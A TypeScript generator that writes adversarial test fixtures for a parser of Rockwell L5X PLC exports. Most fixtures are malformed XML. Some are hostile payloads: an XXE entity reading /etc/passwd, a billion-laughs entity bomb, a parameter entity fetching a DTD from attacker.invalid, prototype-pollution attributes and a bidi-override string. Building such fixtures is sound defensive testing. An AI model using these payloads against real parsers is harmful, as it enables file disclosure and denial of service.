/**
 * Regenerates the adversarial fixtures in this directory (see README.md).
 * Run from the repo root: node fixtures/adversarial/generate.ts
 */
import { writeFileSync } from 'node:fs'
import { join } from 'node:path'
import { fileURLToPath } from 'node:url'

const dir = fileURLToPath(new URL('.', import.meta.url))

const DECL = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
const ROOT_OPEN =
  '<RSLogix5000Content SchemaRevision="1.0" SoftwareRevision="35.00" TargetName="NORTHGATE_PS" TargetType="Controller" ContainsContext="false" ExportDate="Wed Sep 30 14:12:09 2026">\n'

function controller(tagsXml: string, programsXml = ''): string {
  return (
    '<Controller Use="Target" Name="NORTHGATE_PS" ProcessorType="1756-L83E" MajorRev="35" MinorRev="11">\n' +
    '<Tags>\n' +
    tagsXml +
    '</Tags>\n' +
    '<Programs>\n' +
    programsXml +
    '</Programs>\n' +
    '<Tasks>\n<Task Name="MainTask" Type="CONTINUOUS" Priority="10" Watchdog="500">\n<ScheduledPrograms>\n<ScheduledProgram Name="Safety"/>\n</ScheduledPrograms>\n</Task>\n</Tasks>\n' +
    '</Controller>\n'
  )
}

function tag(name: string, description: string): string {
  return (
    `<Tag Name="${name}" TagType="Base" DataType="BOOL" Radix="Decimal" Constant="false" ExternalAccess="Read Only">\n` +
    `<Description>\n<![CDATA[${description}]]>\n</Description>\n` +
    '<Data Format="L5K">\n<![CDATA[0]]>\n</Data>\n' +
    '</Tag>\n'
  )
}

const SAFETY_PROGRAM =
  '<Program Name="Safety" MainRoutineName="Main" Disabled="false">\n<Routines>\n<Routine Name="Main" Type="RLL">\n<RLLContent>\n' +
  '<Rung Number="0" Type="N">\n<Text>\n<![CDATA[XIC(EStop_Healthy)XIO(ESD_Remote_Cmd)OTE(MCC_Main_Enable);]]>\n</Text>\n</Rung>\n' +
  '</RLLContent>\n</Routine>\n</Routines>\n</Program>\n'

const VALID = DECL + ROOT_OPEN + controller(tag('MCC_Main_Enable', 'Main MCC enable') + tag('EStop_Healthy', 'E-stop chain healthy'), SAFETY_PROGRAM) + '</RSLogix5000Content>\n'

const files: Record<string, string> = {}

files['xxe-external-entity.L5X'] =
  DECL +
  '<!DOCTYPE RSLogix5000Content [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n' +
  ROOT_OPEN +
  controller(tag('MCC_Main_Enable', '&xxe;')) +
  '</RSLogix5000Content>\n'

{
  let ents = '<!ENTITY lol "lol">\n'
  for (let i = 1; i <= 9; i++) {
    const prev = i === 1 ? 'lol' : `lol${i - 1}`
    ents += `  <!ENTITY lol${i} "${Array(10).fill(`&${prev};`).join('')}">\n`
  }
  files['billion-laughs.L5X'] =
    DECL + `<!DOCTYPE RSLogix5000Content [\n  ${ents}]>\n` + ROOT_OPEN + controller(tag('Bomb', '&lol9;')) + '</RSLogix5000Content>\n'
}

files['xxe-parameter-entity.L5X'] =
  DECL +
  '<!DOCTYPE RSLogix5000Content [\n  <!ENTITY % remote SYSTEM "http://attacker.invalid/evil.dtd">\n  %remote;\n]>\n' +
  ROOT_OPEN +
  controller(tag('MCC_Main_Enable', 'Main MCC enable')) +
  '</RSLogix5000Content>\n'

// Cut cleanly after a complete <Tag> element: every open element is left unclosed.
{
  const cut = VALID.indexOf('<Tag Name="EStop_Healthy"')
  files['truncated.L5X'] = VALID.slice(0, cut)
}

// The head mentions <RSLogix5000Content (so the L5X sniff matches) but the real root is something else.
files['wrong-root.xml'] =
  DECL +
  '<!-- converted from an <RSLogix5000Content> export by a third-party tool -->\n' +
  '<Project Name="NORTHGATE_PS">\n<Controller Name="NORTHGATE_PS"/>\n</Project>\n'

files['mismatched-tags.L5X'] = VALID.replace('</Description>\n<Data Format="L5K">', '</Descripton>\n<Data Format="L5K">')

files['duplicate-attribute.L5X'] = VALID.replace(
  '<Tag Name="EStop_Healthy" TagType="Base"',
  '<Tag Name="EStop_Healthy" TagType="Base" ExternalAccess="Read/Write"',
)

// The last CDATA in the file (the rung text) never closes, so no later "]]>" can end it by accident.
files['unterminated-cdata.L5X'] = VALID.replace('OTE(MCC_Main_Enable);]]>', 'OTE(MCC_Main_Enable);')

files['not-xml.L5X'] =
  'This is not an L5X export.\nLogix Designer .ACD project files are binary; export the project as L5X (File > Save As > L5X) instead.\n'

files['plcopen-sample.xml'] =
  '<?xml version="1.0" encoding="utf-8"?>\n' +
  '<project xmlns="http://www.plcopen.org/xml/tc6_0201" xmlns:xhtml="http://www.w3.org/1999/xhtml">\n' +
  '  <fileHeader companyName="Northgate Water Authority" productName="Synthetic" productVersion="1.0" creationDateTime="2026-09-30T14:12:09"/>\n' +
  '  <contentHeader name="NORTHGATE_PS">\n    <coordinateInfo>\n      <fbd><scaling x="1" y="1"/></fbd>\n      <ld><scaling x="1" y="1"/></ld>\n      <sfc><scaling x="1" y="1"/></sfc>\n    </coordinateInfo>\n  </contentHeader>\n' +
  '  <types>\n    <dataTypes/>\n    <pous/>\n  </types>\n  <instances>\n    <configurations/>\n  </instances>\n</project>\n'

// In an attribute value (inside CDATA it would be literal text).
files['unknown-entity.L5X'] = VALID.replace('<Task Name="MainTask"', '<Task Name="Main&nbsp;Task"')

{
  let open = ''
  let close = ''
  for (let i = 0; i < 5000; i++) {
    open += '<Nest>'
    close += '</Nest>'
  }
  files['deep-nesting.L5X'] = DECL + ROOT_OPEN + '<Controller Name="NORTHGATE_PS">\n' + open + close + '\n</Controller>\n</RSLogix5000Content>\n'
}

files['missing-program-name.L5X'] = VALID.replace('<Program Name="Safety" MainRoutineName="Main"', '<Program MainRoutineName="Main"')

files['prototype-attributes.L5X'] = VALID.replace(
  '<Tag Name="MCC_Main_Enable" TagType="Base"',
  '<Tag Name="MCC_Main_Enable" __proto__="polluted" constructor="polluted" TagType="Base"',
)

const textFiles = Object.entries(files)
for (const [name, content] of textFiles) {
  if (content === VALID) throw new Error(`${name}: replacement did not apply`)
  writeFileSync(join(dir, name), content, { encoding: 'utf8' })
}

// Real invalid UTF-8: 0xC3 0x28 is a lead byte followed by a non-continuation byte.
{
  const marker = 'Main MCC enable'
  const at = VALID.indexOf(marker) + marker.length
  const before = Buffer.from(VALID.slice(0, at), 'utf8')
  const after = Buffer.from(VALID.slice(at), 'utf8')
  writeFileSync(join(dir, 'invalid-utf8.L5X'), Buffer.concat([before, Buffer.from([0x20, 0xc3, 0x28, 0xff]), after]))
}

// A tag description containing U+202E RIGHT-TO-LEFT OVERRIDE (Trojan Source style).
{
  const rlo = String.fromCodePoint(0x202e)
  const content = VALID.replace('Main MCC enable', `Main MCC enable ${rlo}elbane ton${String.fromCodePoint(0x202c)}`)
  if (content === VALID) throw new Error('bidi replacement did not apply')
  writeFileSync(join(dir, 'bidi-tag-name.L5X'), content, { encoding: 'utf8' })
}

console.log('written', textFiles.length + 2, 'files to', dir)
